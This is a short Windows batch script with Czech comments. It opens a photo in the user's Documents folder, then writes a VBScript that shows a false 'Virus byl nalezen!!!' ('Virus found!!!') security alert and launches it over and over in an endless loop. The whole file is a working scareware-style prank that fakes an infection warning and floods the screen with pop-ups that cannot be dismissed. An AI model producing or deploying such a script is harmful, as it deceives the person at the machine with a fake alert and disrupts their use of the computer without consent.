::Kontrola, jestli fotka.jpg existuje
if not exist c:\users\%username%\documents\fotka.jpg exit

::Spuštění fotky a vytvoření souboru erroru
cd c:\users\%username%\documents\
start fotka.jpg
cd c:\users\public
echo x=MsgBox("Virus byl nalezen!!!", 0+48, "VIRUS ALERT!!!") > Zprava.vbs
timeout /t 3

::Spamování erroru pořád dokola
:a
timeout /t 0
start Zprava.vbs
timeout /t 0
start Zprava.vbs
timeout /t 1
start Zprava.vbs
timeout /t 0
start Zprava.vbs
timeout /t 0
start Zprava.vbs
goto a
